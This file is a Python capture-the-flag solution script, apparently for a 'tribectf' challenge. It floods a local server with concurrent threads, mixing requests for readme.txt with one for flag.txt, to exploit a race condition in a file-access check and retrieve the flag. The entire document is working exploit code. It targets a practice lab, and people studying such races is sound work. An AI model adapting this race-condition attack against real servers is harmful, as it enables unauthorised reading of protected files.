import requests
import threading
import queue

flag_url = "http://localhost:8080?file_name=flag.txt"
valid_url = "http://localhost:8080?file_name=readme.txt"

COUNT = 10
FLAG_PREFIX = "tribectf{"

queue = queue.Queue()

def get_file(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text.strip()
        else:
            return "Failed to retrieve flag, status code: {}".format(response.status_code)
    except Exception as e:
        return "An error occurred: {}".format(str(e))


def file_racer(url, queue):
    while True:
        result = get_file(url)
        if FLAG_PREFIX in result:
            print("Flag found: {}".format(result))
            queue.put(result)
            return
        if not queue.empty():
            print("Flag was found by another thread.")
            return
    

def exploit_race():    
    threads = []
    for i in range(COUNT):
        if i == 0:
            threads.append(threading.Thread(target=file_racer, args=(flag_url, queue,)))
        else:  
            threads.append(threading.Thread(target=file_racer, args=(valid_url, queue,)))
    
    for t in threads:
        t.start()
    
    # Wait for all threads to finish
    for t in threads:
        t.join()
    
    if not queue.empty():
        print("Exploit successful!")
    else:
        print("Exploit failed, no flag found.")
            
if __name__ == "__main__":
    exploit_race()

    